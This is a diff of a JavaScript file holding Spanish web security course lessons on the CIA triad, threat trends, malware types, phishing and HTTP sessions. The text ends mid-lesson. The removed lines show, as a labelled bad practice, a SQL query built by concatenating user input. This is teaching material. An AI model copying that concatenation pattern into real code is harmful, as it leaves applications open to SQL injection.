+    <a href="https://portswigger.net/web-security" target="_blank">
+      https://portswigger.net/web-security
+    </a>
+  </li>
+
+  <li>
+    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
+  </li>
+</ul>
         `
       },
+      // Sección de introducción a seguridad web
     'intro-seguridad': {
       id: 'intro-seguridad',
-      title: 'Introducción a la Seguridad en Aplicaciones Web',
-      description: 'Aprende los fundamentos esenciales de la seguridad web: defensa en profundidad, principio de mínimo privilegio, reducción de superficie de ataque y modelos de amenaza.',
+      title: 'Conceptos clave de seguridad, contexto y retos en web',
+      description: 'Principios fundamentales de la seguridad en aplicaciones web.',
       category: 'security-basics',
       htmlContent: `
-      <h2>Introducción</h2>
-      <p>
-      Este módulo establece los pilares sobre los que se construyen todas las demás prácticas de seguridad vistas en el curso (como la prevención de inyección SQL, XSS o la arquitectura segura). Su propósito es ofrecer una comprensión completa de los principios fundamentales de la seguridad en aplicaciones web modernas: cómo pensar la seguridad desde el diseño, cómo limitar los daños cuando un fallo ocurre y cómo aplicar una mentalidad de defensa en profundidad.
-      </p>
+        <p>
+          La seguridad web constituye una disciplina técnica y estratégica orientada a proteger las aplicaciones, sitios y servicios basados en Internet, junto con los datos y usuarios que interactúan con ellos, contra amenazas, accesos no autorizados y explotaciones maliciosas. Su objetivo principal es garantizar que los activos digitales mantengan características fundamentales de seguridad.
+        </p>
+        <p>
+          A diferencia de enfoques de seguridad pasivos o reactivos, la seguridad web moderna exige la integración de controles técnicos, políticas organizacionales, procesos de desarrollo seguro y capacitación continua. Las aplicaciones web representan la puerta de entrada principal a la mayoría de las organizaciones, exponiéndolas a ataques que pueden comprometer información personal, ejecutar transacciones fraudulentas o afectar a usuarios legítimos.
+        </p>
+        <p>
+          En un contexto donde más del 72% de las empresas han integrado inteligencia artificial en al menos una función de negocio y donde las superficies de ataque se expanden continuamente debido a la adopción de servicios en la nube, APIs públicas y arquitecturas de microservicios, la seguridad web se ha convertido en un imperativo estratégico indispensable.
+        </p>
 
-      <h2>Conceptos Fundamentales</h2>
-      <ul>
-        <li><strong>Seguridad como proceso continuo:</strong> No es un estado ni un producto; es una disciplina que acompaña todo el ciclo de vida del software (desde el diseño hasta la operación). El objetivo no es eliminar todos los riesgos, sino gestionarlos de forma efectiva.</li>
-        <li><strong>Modelo CIA:</strong> Toda política o control de seguridad busca preservar tres propiedades:
-          <ul>
-            <li><em>Confidencialidad:</em> los datos solo deben ser accesibles a quien esté autorizado.</li>
-            <li><em>Integridad:</em> la información no debe ser alterada de manera no autorizada o accidental.</li>
-            <li><em>Disponibilidad:</em> los sistemas y servicios deben estar accesibles cuando se necesiten.</li>
-          </ul>
-        </li>
-        <li><strong>Superficie de ataque:</strong> Es el conjunto total de puntos a través de los cuales un atacante podría interactuar con la aplicación o el sistema. Reducirla significa eliminar funcionalidades innecesarias, cerrar puertos, desactivar APIs o endpoints no usados y minimizar el código expuesto al usuario.</li>
-        <li><strong>Principio de Mínimo Privilegio:</strong> Cada componente, servicio o usuario debe tener solo los permisos estrictamente necesarios para cumplir su función. Esto limita el impacto de una vulnerabilidad: si una inyección SQL ocurre, la cuenta de base de datos con permisos mínimos no podrá ejecutar comandos destructivos.</li>
-        <li><strong>Defensa en profundidad:</strong> Consiste en establecer múltiples capas de protección que se refuercen entre sí. Si una capa falla (por ejemplo, la validación de entrada), otra (como la parametrización o el control de acceso a la BD) debe contener el daño. Una buena arquitectura no confía en una sola barrera.</li>
-      </ul>
+        <h2>Conceptos clave de seguridad web</h2>
+        <p>
+          La tríada CIA es el modelo conceptual más utilizado en seguridad de la información y representa tres objetivos esenciales que toda estrategia de seguridad debe cumplir, estos son: confidencialidad (Confidentiality), integridad (Integrity) y disponibilidad (Availability). Estos principios fueron desarrollados para proporcionar un marco unificado que permita a las organizaciones evaluar, diseñar e implementar controles de seguridad efectivos.
+        </p>
 
-      <h2>Seguridad en el Ciclo de Vida del Software (SDLC)</h2>
-      <p>
-      La seguridad debe integrarse en cada fase del desarrollo, no añadirse al final. Cada etapa tiene sus responsabilidades:
-      </p>
-      <ol>
-        <li><strong>Diseño:</strong> aplicar seguridad por diseño. Identificar activos críticos, modelar amenazas (p. ej. STRIDE o PASTA), y definir requisitos de seguridad. Evitar patrones peligrosos como ejecutar SQL dinámico o exponer datos sensibles por conveniencia.</li>
-        <li><strong>Implementación:</strong> seguir guías de codificación segura: uso de consultas parametrizadas, validaciones en servidor, manejo correcto de errores y logs sin exponer información sensible. Revisar código (code review) enfocado en vulnerabilidades.</li>
-        <li><strong>Pruebas:</strong> realizar auditorías de seguridad, pruebas de penetración y análisis estático (SAST) y dinámico (DAST). Probar comportamientos inesperados (inyecciones, inputs maliciosos, XSS, etc.).</li>
-        <li><strong>Despliegue:</strong> asegurar la configuración de entornos (hardening de servidores, HTTPS, secretos en variables de entorno, deshabilitar módulos innecesarios).</li>
-        <li><strong>Operación y monitoreo:</strong> registrar eventos relevantes, detectar anomalías (p. ej., múltiples errores SQL o intentos de login fallidos) y aplicar actualizaciones de seguridad de forma regular.</li>
-      </ol>
+        <h3>Confidencialidad</h3>
+        <p>
+          La confidencialidad se refiere a la protección de la información contra el acceso no autorizado, asegurando que únicamente las personas, sistemas o procesos autorizados puedan acceder a datos sensibles. Este principio se aplica tanto a datos en reposo (almacenados en bases de datos, discos, archivos) como a datos en tránsito (transmitidos a través de redes).
+        </p>
+        <p>
+          La pérdida de confidencialidad puede resultar en filtraciones masivas de datos personales, exposición de secretos comerciales, información gubernamental clasificada o credenciales de acceso. Según el informe de IBM sobre el costo de las brechas de datos de 2024, el costo promedio de una violación de datos alcanzó los 4.88 millones de dólares, un incremento significativo respecto a años anteriores.
+        </p>
+        <p>Las técnicas más comunes para garantizar confidencialidad incluyen:</p>
+        <ul>
+          <li>Cifrado de datos: Uso de algoritmos criptográficos para proteger información sensible tanto en almacenamiento como en transmisión (<code>TLS/SSL</code>, <code>AES</code>, <code>RSA</code>).</li>
+          <li>Control de accesos basado en roles (RBAC): Limitación de privilegios según las responsabilidades del usuario.</li>
+          <li>Autenticación multifactor (MFA): Verificación de identidad mediante múltiples factores (algo que se sabe, algo que se tiene, algo que se es).</li>
+          <li>Gestión de identidades y accesos (IAM): Políticas centralizadas para administrar quién accede a qué recursos y en qué condiciones.</li>
+        </ul>
 
-      <h2>Principios Clave de Diseño Seguro</h2>
-      <ul>
-        <li><strong>Seguridad por defecto:</strong> toda funcionalidad debe ser segura sin configuración adicional (por ejemplo, denegar accesos por defecto y requerir reglas explícitas para permitirlos).</li>
-        <li><strong>Fallar de forma segura:</strong> cuando algo sale mal, el sistema debe entrar en un estado seguro. Ejemplo: si una validación falla, se debe rechazar la solicitud, no procesarla parcialmente.</li>
-        <li><strong>Separación de responsabilidades:</strong> el código de aplicación no debe tener privilegios de administración de base de datos; el servidor web no debe ejecutar comandos del sistema operativo.</li>
-        <li><strong>Minimización de exposición:</strong> exponer solo la información estrictamente necesaria. No incluir versiones de software en cabeceras HTTP, ni mostrar trazas de error al cliente.</li>
-        <li><strong>Auditoría y trazabilidad:</strong> toda acción relevante debe poder rastrearse. Esto no solo sirve para detectar ataques, sino también para demostrar cumplimiento.</li>
-      </ul>
+        <h3>Integridad</h3>
+        <p>
+          La integridad consiste en garantizar que los datos sean precisos, completos y no hayan sido alterados de forma no autorizada durante su ciclo de vida. Este principio abarca tanto la integridad de los datos (los datos no han sido modificados accidental o deliberadamente) como la integridad de la fuente (los datos provienen de una fuente legítima y confiable).
+        </p>
+        <p>
+          Si un atacante logra modificar datos en una base de datos, alterar el contenido de un sitio web, manipular transacciones financieras o inyectar código malicioso, la integridad del sistema se ve comprometida. Las consecuencias pueden incluir decisiones empresariales erróneas basadas en información falsa, pérdidas financieras directas y daño reputacional severo.
+        </p>
+        <p>Para proteger la integridad se emplean técnicas como:</p>
+        <ul>
+          <li>Funciones hash criptográficas: Algoritmos (<code>SHA-256</code>, <code>SHA-3</code>) que generan un identificador único para verificar que los datos no han sido alterados.</li>
+          <li>Firmas digitales: Mecanismos que combinan hash criptográfico con cifrado asimétrico para autenticar la fuente y verificar la integridad.</li>
+          <li>Certificados digitales y <code>SSL/TLS</code>: Protocolos que aseguran la autenticidad del servidor y la integridad de las comunicaciones.</li>
+          <li>Controles de versiones y auditoría: Registros detallados de cambios que permiten rastrear modificaciones y revertir alteraciones no autorizadas.</li>
+        </ul>
 
-      <h2>Ejemplos Prácticos</h2>
-      <ul>
-        <li><strong>Buena práctica (parámetros seguros):</strong><br/>
-        <code>SELECT * FROM users WHERE id = ?</code><br/>
-        La consulta es segura porque separa datos de comandos.</li>
-        <li><strong>Mala práctica (concatenación directa):</strong><br/>
-        <code>"SELECT * FROM users WHERE id = " + userInput</code><br/>
-        El valor del usuario forma parte del comando SQL, lo que abre la puerta a una inyección.</li>
-        <li><strong>Fallar de forma insegura:</strong><br/>
-        Mostrar <em>stack trace</em> con información interna al usuario. Ejemplo: “DatabaseException: error near SELECT on file db_conn.php:42”. Esto da pistas valiosas a un atacante.</li>
-      </ul>
+        <h3>Disponibilidad</h3>
+        <p>
+          La disponibilidad asegura que los sistemas, aplicaciones y datos estén accesibles para los usuarios autorizados en el momento en que los necesiten. Este principio es crítico para la continuidad operacional de las organizaciones, especialmente en sectores donde la interrupción de servicios puede tener consecuencias catastróficas (salud, finanzas, servicios públicos).
+        </p>
+        <p>
+          Los ataques de denegación de servicio (DoS y DDoS), fallos de hardware, errores de configuración, desastres naturales o ataques de ransomware pueden comprometer la disponibilidad. Según reportes recientes, el ransomware representa el 81.1% de los incidentes de ciberseguridad dirigidos contra organizaciones en la Unión Europea.
+        </p>
+        <p>Las estrategias para garantizar disponibilidad incluyen:</p>
+        <ul>
+          <li>Redundancia y balanceo de carga: Distribución de tráfico entre múltiples servidores para evitar puntos únicos de fallo.</li>
+          <li>Copias de seguridad (backups) y recuperación ante desastres: Planes y procedimientos para restaurar servicios críticos tras un incidente.</li>
+          <li>Monitoreo continuo y respuesta a incidentes: Sistemas automatizados que detectan anomalías y activan protocolos de respuesta.</li>
+          <li>Protección contra DDoS: Uso de servicios especializados que filtran tráfico malicioso antes de que afecte la infraestructura.</li>
+        </ul>
 
-      <h2>Errores Comunes</h2>
-      <ul>
-        <li>Asumir que las aplicaciones internas no necesitan controles fuertes.</li>
-        <li>Confiar en la validación del lado cliente y omitir la del servidor.</li>
-        <li>Reutilizar credenciales administrativas para desarrollo y producción.</li>
-        <li>No tener políticas claras de rotación de contraseñas y llaves API.</li>
-        <li>Desestimar vulnerabilidades “porque nadie las ha explotado todavía”.</li>
-      </ul>
+        <h2>Contexto actual del panorama de amenazas</h2>
+        <p>
+          El entorno de seguridad web ha evolucionado drásticamente en los últimos años, caracterizado por un incremento tanto en la frecuencia como en la sofisticación de los ataques. Según análisis de Microsoft y otras organizaciones líderes en ciberseguridad, las empresas enfrentan más de 600 millones de ataques diarios, incluyendo ransomware, phishing, ataques de identidad y explotación de vulnerabilidades conocidas.
+        </p>
+        <p>
+          Un desarrollo preocupante observado en 2025 es la incorporación de inteligencia artificial generativa por parte de actores maliciosos para mejorar la eficacia de sus ataques. Los atacantes utilizan modelos de lenguaje para:
+        </p>
+        <ul>
+          <li>Crear correos electrónicos de phishing altamente convincentes y personalizados a escala masiva.</li>
+          <li>Desarrollar sitios web falsos que imitan organizaciones legítimas con mayor precisión.</li>
+          <li>Generar deepfakes para suplantar identidades en ataques de ingeniería social.</li>
+          <li>Automatizar la escritura de código malicioso y exploits.</li>
+        </ul>
+        <p>
+          El informe X-Force de IBM documentó un incremento del 84% en la entrega de infostealers (malware diseñado para robar credenciales) mediante correos de phishing entre 2023 y 2024, junto con un aumento del 12% año tras año en la venta de credenciales robadas en la dark web.
+        </p>
 
-      <h2>Buenas Prácticas</h2>
-      <ul>
-        <li><strong>Usar HTTPS siempre:</strong> protege la confidencialidad e integridad del tráfico (TLS 1.2 o superior).</li>
-        <li><strong>Separar entornos:</strong> desarrollo, pruebas y producción deben ser independientes, con distintas credenciales y accesos.</li>
-        <li><strong>Automatizar la revisión de dependencias:</strong> herramientas como OWASP Dependency-Check o npm audit ayudan a detectar librerías vulnerables.</li>
-        <li><strong>Aplicar defensa en profundidad:</strong> parametrización + validación + permisos mínimos + monitoreo + WAF.</li>
-        <li><strong>Educar al equipo:</strong> todos los desarrolladores deben comprender amenazas comunes (OWASP Top 10) y patrones de mitigación.</li>
-      </ul>
+        <h2>Vulnerabilidades en aplicaciones web</h2>
+        <p>
+          Las aplicaciones web continúan siendo objetivos prioritarios debido a su accesibilidad pública, la presencia de vulnerabilidades heredadas de bibliotecas de código abierto y la presión constante sobre los desarrolladores para lanzar código rápidamente. Según auditorías recientes:
+        </p>
+        <ul>
+          <li>Cross-Site Scripting (XSS) está presente en aproximadamente el 18% de las aplicaciones web analizadas.</li>
+          <li>SQL Injection afecta al 25% de las aplicaciones, aunque su prevalencia ha disminuido gradualmente gracias a mejores prácticas de desarrollo.</li>
+          <li>Vulnerabilidades en APIs representan el 33% de las brechas en aplicaciones web, convirtiéndose en el vector más crítico debido a la adopción masiva de arquitecturas basadas en APIs.</li>
+          <li>Autenticación rota está presente en el 27% de las aplicaciones, permitiendo a atacantes comprometer cuentas de usuario mediante credenciales débiles o mecanismos de autenticación mal implementados.</li>
+        </ul>
 
-      <h2>Resumen</h2>
-      <p>
-      La seguridad en aplicaciones web no depende de una sola técnica ni de una herramienta, sino de una mentalidad integral. Aplicar el principio de mínimo privilegio, la defensa en profundidad, y la seguridad desde el diseño crea sistemas más resilientes. Las vulnerabilidades como la inyección SQL o el XSS son consecuencias directas de romper estos principios. Entenderlos y aplicarlos correctamente es el primer paso hacia un desarrollo verdaderamente seguro.
-      </p>
+        <h2>Motivaciones de los atacantes</h2>
+        <p>
+          Las motivaciones detrás de los ataques cibernéticos son diversas y han evolucionado conforme la tecnología y la geopolítica se transforman.
+        </p>
+        <p>
+          Aproximadamente el 55% de los ataques están impulsados por ganancias económicas. Los atacantes buscan:
+        </p>
+        <ul>
+          <li>Acceder a información financiera (tarjetas de crédito, cuentas bancarias).</li>
+          <li>Extorsionar mediante ransomware, cifrando datos críticos y exigiendo rescates.</li>
+          <li>Robar credenciales y venderlas en mercados clandestinos de la dark web.</li>
+          <li>Realizar fraudes electrónicos y transferencias no autorizadas.</li>
+        </ul>
+        <p>
+          El sector financiero, servicios empresariales y comercio electrónico son los blancos predilectos de este tipo de actividad criminal.
+        </p>
+        <p>
+          Otro motivo tiene que ver con espionaje y objetivos geopolíticos. Los actores, respaldados por estados-nación, realizan operaciones de ciberespionaje para obtener secretos militares, industriales o políticos. Estos ataques han aumentado significativamente en contextos de conflictos geopolíticos, con grupos afiliados a gobiernos que emplean técnicas avanzadas, explotan vulnerabilidades de día cero y, en algunos casos, subcontratan operaciones a grupos criminales.
+        </p>
+        <p>
+          Por otro lado, existen grupos hacktivistas que buscan promover causas políticas o ideológicas mediante ataques DDoS, defacement de sitios web o filtración de información confidencial. Aunque sus motivaciones difieren de las puramente criminales, el impacto sobre las organizaciones puede ser igualmente severo.
+        </p>
+        <p>
+          También, lgunos ataques tienen como objetivo causar daño directo a la infraestructura, interrumpir operaciones críticas o dañar la reputación de organizaciones. Los ataques tipo "wiper" (destrucción masiva de datos) y las campañas de denegación de servicio prolongadas ejemplifican esta categoría.
+        </p>
+
+        <h2>Retos actuales en la seguridad web</h2>
+        <p>
+          La seguridad web enfrenta múltiples desafíos que se intensifican conforme aumenta la complejidad de las aplicaciones y la sofisticación de los atacantes. Algunos de ellos son:
+        </p>
+        <ol>
+          <li>
+            <strong>Expansión de las superficies de ataque:</strong> La adopción masiva de servicios en la nube, dispositivos IoT, arquitecturas de microservicios y APIs públicas ha ampliado drásticamente las superficies de ataque. Cada nuevo punto de entrada representa una potencial vulnerabilidad que debe ser monitoreada y protegida.
+          </li>
+          <li>
+            <strong>Velocidad del desarrollo versus seguridad:</strong> La presión para lanzar productos rápidamente en entornos DevOps y CI/CD puede resultar en la implementación de código sin las revisiones de seguridad adecuadas. Los conflictos entre los objetivos de los desarrolladores (entregar funcionalidades rápidamente) y los equipos de seguridad (minimizar riesgos) representan un desafío organizacional significativo.
+          </li>
+          <li>
+            <strong>Gestión deficiente de secretos y controles de acceso:</strong> Los entornos DevOps a menudo requieren acceso privilegiado controlado y gestión rigurosa de secretos (credenciales, claves SSH, tokens API). Sin embargo, en la búsqueda de velocidad, muchos equipos adoptan prácticas inseguras como almacenar credenciales en archivos dentro de contenedores, ejecutar procesos con acceso root innecesario o compartir credenciales administrativas.
+          </li>
+          <li>
+            <strong>Factor humano:</strong> Más del 82% de las violaciones de seguridad involucraron algún elemento humano, incluyendo uso de credenciales robadas, phishing exitoso, errores de configuración y uso indebido de privilegios. La capacitación continua y la concientización son fundamentales, pero difíciles de mantener consistentemente en organizaciones grandes y dinámicas.
+          </li>
+        </ol>
+
+        <h2>Referencias</h2>
+        <ul>
+          <li>D. Stuttard y M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Indianapolis, IN: Wiley Publishing, 2011.</li>
+
+          <li>
+            TechTarget, “What is the CIA triad (confidentiality, integrity and availability)?”, 
+            [Online]. Available: 
+            <a href="https://www.techtarget.com/whatis/definition/Confidentiality-integrity-and-availability-CIA" target="_blank">
+              https://www.techtarget.com/whatis/definition/Confidentiality-integrity-and-availability-CIA
+            </a>
+          </li>
+
+          <li>
+            Snyk, “Secure Software Development Lifecycle (SSDLC),” [Online]. Available: 
+            <a href="https://snyk.io/articles/secure-sdlc/" target="_blank">
+              https://snyk.io/articles/secure-sdlc/
+            </a>
+          </li>
+
+          <li>
+            OWASP, “OWASP Top Ten,” 2021. [Online]. Available: 
+            <a href="https://owasp.org/www-project-top-ten/" target="_blank">
+              https://owasp.org/www-project-top-ten/
+            </a>
+          </li>
+
+          <li>
+            IBM, “IBM X-Force Threat Intelligence Index 2024,” [Online]. Available: 
+            <a href="https://www.ibm.com/reports/threat-intelligence" target="_blank">
+              https://www.ibm.com/reports/threat-intelligence
+            </a>
+          </li>
+
+          <li>
+            IBM Security, “Cost of a Data Breach Report 2023,” [Online]. Available:
+            <a href="https://www.ibm.com/reports/data-breach" target="_blank">
+              https://www.ibm.com/reports/data-breach
+            </a>
+          </li>
+
+          <li>
+            Wiz, “What is Secure SDLC (SSDLC)?,” [Online]. Available:
+            <a href="https://www.wiz.io/academy/secure-sdlc" target="_blank">
+              https://www.wiz.io/academy/secure-sdlc
+            </a>
+          </li>
+        </ul>
       `
+    },
+    'amenazas-vulnerabilidades': {
+      id: 'amenazas-vulnerabilidades',
+      title: 'Amenazas y vulnerabilidades',
+      description: 'Los riesgos más frecuentes y sus implicaciones en el entorno web moderno.',
+      category: 'security-basics',
+      htmlContent: `
+        <p>
+          El panorama actual de amenazas en ciberseguridad se caracteriza por la sofisticación, velocidad y escala sin precedentes de los ataques. Las organizaciones enfrentan adversarios que van desde grupos criminales motivados por ganancias económicas hasta actores respaldados por estados-nación que ejecutan campañas de espionaje y sabotaje. Más de 100 billones de señales son procesadas diariamente por proveedores de seguridad líderes, bloqueando alrededor de 4.5 millones de nuevos intentos de malware cada día y filtrando 5 mil millones de correos electrónicos en busca de phishing y contenido malicioso.
+        </p>
+
+        <p>
+          En esta lección se pretende examina las principales categorías de amenazas que enfrentan las aplicaciones web y sistemas conectados a Internet.
+        </p>
+
+        <h2>Malware y sus variantes principales</h2>
+        <p>
+          El malware (software malicioso) es cualquier programa o código diseñado para causar daño, robar información, obtener acceso no autorizado o alterar el comportamiento normal de sistemas y aplicaciones. El malware sigue siendo una de las amenazas más dominantes y dinámicas, evolucionando constantemente para evadir sistemas de detección. Existen diferentes tipos de malware, entre los cuales se encuentran:
+        </p>
+
+        <h3>Ransomware</h3>
+        <p>
+          El ransomware es un tipo de malware que cifra archivos del dispositivo infectado utilizando claves criptográficas conocidas únicamente por el atacante. El operador del ransomware exige un rescate económico a cambio de la clave de descifrado necesaria para restaurar los datos. En los últimos años, el ransomware se ha consolidado como una de las amenazas más visibles y costosas.
+        </p>
+        <p>
+          Los ataques de ransomware han aumentado más del 200% año tras año según reportes recientes, con más del 80% de los incidentes investigados orientados al robo de datos como parte de esquemas de extorsión. Los sectores más afectados incluyen salud, gobierno, educación y servicios financieros, donde la interrupción de servicios puede tener consecuencias críticas.
+        </p>
+        <p>
+          Un cambio significativo en el comportamiento del ransomware es la adopción del modelo de doble extorsión: además de cifrar los datos, los atacantes extraen  información confidencial antes del cifrado y amenazan con publicarla si la víctima no paga.
+        </p>
+
+        <h3>Troyanos</h3>
+        <p>
+          Los troyanos son programas maliciosos que se presentan como software legítimo o útil. Una vez que la víctima descarga y ejecuta el troyano, este despliega su funcionalidad maliciosa. Los Remote Access Trojans (RATs) son una subcategoría diseñada específicamente para proporcionar acceso remoto no autorizado al atacante, permitiéndole controlar el sistema infectado, instalar software adicional, robar credenciales y moverse lateralmente en la red.
+        </p>
+
+        <h3>Spyware e Infostealers</h3>
+        <p>
+          El spyware está diseñado para recopilar información sensible sin el conocimiento del usuario, incluyendo credenciales de acceso, datos financieros, historial de navegación y comunicaciones. Los infostealers son una variante moderna y altamente efectiva, capaz de extraer tokens de sesión de navegadores, credenciales almacenadas y cookies de autenticación.
+        </p>
+        <p>
+          Según el informe IBM X-Force 2024, se documentó un incremento del 84% en la entrega de infostealers mediante correos electrónicos de phishing entre 2023 y 2024, junto con un aumento del 12% en la venta de credenciales robadas en mercados clandestinos de la dark web.
+        </p>
+
+        <h3>Cryptojacking</h3>
+        <p>
+          El cryptojacking es el uso no autorizado de recursos computacionales de una víctima para minar criptomonedas. El malware de cryptojacking se ejecuta en segundo plano, consumiendo capacidad de procesamiento y energía sin conocimiento del usuario, generando ingresos para el atacante mientras degrada el rendimiento del sistema infectado.
+        </p>
+
+        <h2>Ingeniería social</h2>
+        <p>
+          La ingeniería social abarca técnicas psicológicas y de manipulación utilizadas por atacantes para engañar a las víctimas y lograr que revelen información sensible, ejecuten acciones peligrosas o concedan acceso a sistemas protegidos. A diferencia de los ataques puramente técnicos, la ingeniería social explota la confianza, el miedo, la urgencia o la autoridad percibida.
+        </p>
+
+        <h3>Phishing</h3>
+        <p>
+          El phishing es la técnica de ingeniería social más prevalente. Consiste en el envío de comunicaciones fraudulentas (generalmente correos electrónicos) que aparentan provenir de fuentes legítimas para engañar a las víctimas y lograr que revelen credenciales, hagan clic en enlaces maliciosos o descarguen archivos infectados.
+        </p>
+        <p>Los ataques de phishing han evolucionado significativamente:</p>
+        <ul>
+          <li>Los correos electrónicos con malware han aumentado un 131%.</li>
+          <li>El 45% de las infecciones de ransomware ahora se originan a partir de correos de phishing.</li>
+          <li>Los atacantes utilizan infraestructuras legítimas en la nube para alojar sitios de phishing, dificultando su detección mediante sistemas de seguridad tradicionales.</li>
+        </ul>
+        <p>
+          Los archivos adjuntos tradicionalmente considerados inofensivos, como .TXT y .DOC, se han convertido en vectores principales de malware, aprovechando la confianza de los usuarios en estos formatos.
+        </p>
+
+        <h3>Business Email Compromise (BEC)</h3>
+        <p>
+          El BEC es un ataque sofisticado en el que el atacante suplanta la identidad de un ejecutivo o proveedor confiable para engañar a empleados y lograr transferencias fraudulentas de fondos o revelación de información confidencial. Según reportes de la industria, el BEC ha causado pérdidas superiores a los $43 mil millones de dólares a nivel global.
+        </p>
+
+        <h2>Ataques a la cadena de suministro</h2>
+        <p>
+          Los ataques a la cadena de suministro explotan la confianza que las organizaciones depositan en sus proveedores, socios y componentes de software de terceros. Los atacantes comprometen a un proveedor confiable para acceder a múltiples organizaciones objetivo simultáneamente.
+        </p>
+        <p>
+          El acceso de terceros representa un vector crítico: las organizaciones permiten a proveedores y socios acceder a sus entornos de TI, y si un atacante compromete la red de un socio confiable, puede explotar ese acceso legítimo para infiltrarse en la organización objetivo.
+        </p>
+
+        <h2>Referencias</h2>
+        <ul>
+          <li>
+            Fortinet. (2025). Informe global del panorama de amenazas de 2025. [Online]. Available: 
+            <a href="https://www.fortinet.com/lat/resources/reports/threat-landscape-report" target="_blank">
+              https://www.fortinet.com/lat/resources/reports/threat-landscape-report
+            </a>
+          </li>
+
+          <li>
+            Check Point. (2024). Las 10 principales vulnerabilidades de OWASP. [Online]. Available: 
+            <a href="https://www.checkpoint.com/es/cyber-hub/cloud-security/what-is-application-security-appsec/owasp-top-10-vulnerabilities/" target="_blank">
+              https://www.checkpoint.com/es/cyber-hub/cloud-security/what-is-application-security-appsec/owasp-top-10-vulnerabilities/
+            </a>
+          </li>
+
+          <li>
+            Microsoft. (2024). La extorsión y el ransomware impulsan más de la mitad de los ciberataques. [Online]. Available: 
+            <a href="https://news.microsoft.com/source/latam/" target="_blank">
+              https://news.microsoft.com/source/latam/
+            </a>
+          </li>
+
+          <li>
+            Check Point. (2025). Las 6 principales amenazas a la ciberseguridad. [Online]. Available: 
+            <a href="https://www.checkpoint.com/es/cyber-hub/cyber-security/what-is-cybersecurity/top-6-cybersecurity-threats/" target="_blank">
+              https://www.checkpoint.com/es/cyber-hub/cyber-security/what-is-cybersecurity/top-6-cybersecurity-threats/
+            </a>
+          </li>
+
+          <li>
+            OWASP. (2021). OWASP Top 10:2021. [Online]. Available: 
+            <a href="https://owasp.org/Top10/es/" target="_blank">
+              https://owasp.org/Top10/es/
+            </a>
+          </li>
+
+          <li>
+            Hornetsecurity. (2025). Tendencias en ciberseguridad que demuestran que los ciberdelincuentes están evolucionando. [Online]. Available: 
+            <a href="https://www.hornetsecurity.com/es/blog/tendencias-ciberseguridad/" target="_blank">
+              https://www.hornetsecurity.com/es/blog/tendencias-ciberseguridad/
+            </a>
+          </li>
+
+          <li>
+            IBM Security. (2024). IBM X-Force Threat Intelligence Index 2024. [Online]. Available: 
+            <a href="https://www.ibm.com/reports/threat-intelligence" target="_blank">
+              https://www.ibm.com/reports/threat-intelligence
+            </a>
+          </li>
+
+          <li>
+            PwC México. (2025). Tendencias y prioridades de ciberseguridad e IA en México 2024. [Online]. Available: 
+            <a href="https://www.pwc.com/mx/es/ciberseguridad/digital-trust.html" target="_blank">
+              https://www.pwc.com/mx/es/ciberseguridad/digital-trust.html
+            </a>
+          </li>
+
+          <li>
+            CrowdStrike. (2025). Informe Global sobre Amenazas 2025. [Online]. Available: 
+            <a href="https://www.crowdstrike.com/es-es/global-threat-report/" target="_blank">
+              https://www.crowdstrike.com/es-es/global-threat-report/
+            </a>
+          </li>
+
+          <li>
+            D. Stuttard y M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Indianapolis, IN: Wiley Publishing, 2011.
+          </li>
+        </ul>
+    `
+    },
+    'fundamentos-tecnicos': {
+      id: 'fundamentos-tecnicos',
+      title: 'Fundamentos técnicos',
+      description: 'Estructura del protocolo HTTP, mecanismos de autenticación y gestión de sesiones.',
+      category: 'security-basics',
+      htmlContent: `
+        <h2>Estructura del protocolo HTTP</h2>
+
+        <p>
+          El protocolo HTTP es el mecanismo principal mediante el cual los navegadores y las aplicaciones intercambian información con los servidores web. Su diseño es simple y directo: el cliente envía una solicitud y el servidor responde con un resultado. Esta simplicidad es la razón de su eficiencia, pero también la causa de muchas vulnerabilidades que se originan en la manera en que las solicitudes son interpretadas, manipuladas o redirigidas a través de la red.
+        </p>
+
+        <p>
+          HTTP es un protocolo sin estado, lo que significa que no conserva información de solicitudes previas. Cada vez que un cliente se comunica con el servidor, la interacción es tratada como un evento independiente. Esta característica obliga a las aplicaciones web a implementar mecanismos adicionales para mantener continuidad, como sesiones, cookies y otros elementos que se explicarán más adelante.
+        </p>
+
+        <p>
+          Una solicitud HTTP está compuesta por un método, un recurso solicitado, una versión del protocolo y un conjunto de encabezados. Los métodos más utilizados son <code>GET</code> y <code>POST</code>. <code>GET</code> se emplea para recuperar información, mientras que <code>POST</code> se usa para enviar datos al servidor. Aunque ambos pueden transmitir información, la práctica recomendada es reservar <code>GET</code> para solicitudes que no modifican el estado del servidor y utilizar <code>POST</code> para operaciones más sensibles o que involucran datos personales. La respuesta del servidor consta de un código de estado, encabezados y un cuerpo que contiene el contenido solicitado. Un ejemplo típico es el código <code>200</code>, que indica éxito, mientras que <code>404</code> señala que el recurso no existe.
+        </p>
+
+        <p>
+          El uso de HTTPS, una extensión de HTTP que utiliza cifrado mediante <code>TLS</code>, es fundamental para proteger la integridad y la confidencialidad de la comunicación. Sin esta capa de seguridad, cualquier elemento transmitido puede ser interceptado y leído por un atacante con acceso al tráfico de red. Esto incluye credenciales, datos personales y cookies de sesión. Toda aplicación moderna debe operar exclusivamente sobre HTTPS para evitar la exposición de información sensible.
+        </p>
+
+        <h2>Gestión de sesiones en aplicaciones web</h2>
+
+        <p>
+          Debido a que HTTP no mantiene estado, las aplicaciones utilizan el concepto de sesión para identificar a un usuario a lo largo de múltiples solicitudes. Una sesión es un espacio temporal donde se almacena información relevante, como si el usuario está autenticado, qué permisos tiene o qué acciones ha realizado recientemente. Sin sesiones, el servidor no podría distinguir entre un usuario legítimo y un visitante que acaba de abrir la aplicación por primera vez.
+        </p>
+
+        <p>
+          El elemento central de la sesión es el identificador de sesión, también conocido como Session ID. Este identificador funciona como un comprobante que permite al servidor reconocer al usuario en siguientes interacciones. Normalmente se genera después de un inicio de sesión exitoso y se almacena en una cookie que el navegador envía de forma automática en cada solicitud posterior. El Session ID debe ser aleatorio, difícil de adivinar y suficientemente largo para evitar ataques basados en predicción o fuerza bruta.
+        </p>
+
+        <p>
